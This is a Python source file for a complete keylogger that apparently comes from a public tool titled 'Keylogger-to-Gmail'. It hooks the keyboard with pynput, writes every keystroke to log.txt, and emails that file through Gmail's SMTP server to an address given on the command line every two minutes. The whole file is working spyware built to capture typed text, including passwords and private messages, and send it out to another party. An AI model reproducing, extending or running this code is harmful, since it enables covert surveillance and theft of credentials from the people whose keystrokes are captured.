from pynput.keyboard import Key, Listener
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading
import os
import argparse
from termcolor import cprint, colored
def header():
    cprint(
        """\
  _  __          _                                    _               _____                 _ _ 
 | |/ /         | |                                  | |             / ____|               (_) |
 | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ ______| |_ ___ ______| |  __ _ __ ___   __ _ _| |
 |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|______| __/ _ \______| | |_ | '_ ` _ \ / _` | | |
 | . \  __/ |_| | | (_) | (_| | (_| |  __/ |         | || (_) |     | |__| | | | | | | (_| | | |
 |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|          \__\___/       \_____|_| |_| |_|\__,_|_|_|
            __/ |         __/ | __/ |                                                           
           |___/         |___/ |___/                                                            

           
            by Hadi El Nawfal\n""", 'light_magenta')

header()

parser = argparse.ArgumentParser(description="Capture keystrokes and send them to desired Gmail every 2 minutes")

parser.add_argument("--sender","-s", required=True, help="Sender email address")
parser.add_argument("--receiver", "-r", required=True, help="Receiver email address")
parser.add_argument("--password", "-p", required=True, help="Email account password")

args = parser.parse_args()

sender_email = args.sender
receiver_email = args.receiver
password = args.password

def create_log_file():
    with open("log.txt", "w"):
        pass

#Check if log.txt file exists, if not, create it   

if not os.path.exists("log.txt"):
    create_log_file()
    
keys = []

def keypress(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))

def writefile(key):
    with open("log.txt", 'a') as f:
        try:
            char = key.char
            keystr = str(char)
            if keystr != 'None':
                f.write(keystr)
        except AttributeError:
            if key == Key.space:
                f.write(' ')
            elif key == Key.enter:
                f.write('\n')
            elif key == Key.cmd or key == Key.shift or key == Key.esc or key == Key.ctrl_l or key == Key.alt_l or key == Key.alt_gr or key == Key.ctrl_r or key == Key.shift_r or key == Key.caps_lock or key == Key.tab or key == Key.left or key == Key.down or key == Key.up or key == Key.right or key == Key.alt or key == Key.page_up or key == Key.page_down or key == Key.insert or key == Key.backspace:
                pass
            else:
                f.write(str(key))

def keyrelease(key):
    if key == Key.esc:
        return False

def send_email_thread():
    while True:
        send_email()
        time.sleep(120)
    
def send_email():

    subject = "Email with Attachment"
    body = "Keystrokes in the attached log file."
    attachment_file = "log.txt"

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject

    message.attach(MIMEText(body, "plain"))

    with open(attachment_file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename= {attachment_file}")
    message.attach(part)

    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, password) 
        server.sendmail(sender_email, receiver_email, message.as_string())

    print("Email with attachment sent successfully")

email_thread = threading.Thread(target=send_email_thread)
email_thread.start()

with Listener(on_press=writefile, on_release=keyrelease) as listener:
    listener.join()
